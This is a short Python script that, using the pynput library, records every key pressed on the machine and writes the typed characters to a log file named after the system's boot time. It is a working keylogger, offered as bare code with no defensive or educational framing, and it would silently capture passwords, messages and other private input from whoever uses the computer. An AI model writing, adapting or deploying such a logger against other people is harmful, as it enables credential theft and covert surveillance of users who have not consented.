from pynput.keyboard import Key, Listener
from time import ctime
from psutil import boot_time
from queue import Queue
from threading import Thread
import os

class save_typing(Thread):
    def __init__(self, queuE):
        Thread.__init__(self)
        
        save_path = os.path.join("logs","{}.txt".format(ctime(boot_time()).replace(":","_")))
        if not os.path.exists(save_path):
            os.makedirs(os.path.dirname(save_path))

        self.filE = open(save_path, "w")
    
        self.queuE = queuE
    
    def run(self):
        while True:
            if not self.queuE.empty(): 
                self.filE.write(self.queuE.get())
                self.filE.flush()

def on_press(key):
    global typed
    try:
        typed.put(key.char.replace("'",""))
    except AttributeError :
        if str(key) == "Key.space":
            typed.put(" ")       


if __name__ == "__main__":

    typed = Queue()
    save_thread = save_typing(typed)
    save_thread.start()

    # Collect events until released
    with Listener(on_press=on_press) as listener:
        listener.join()
         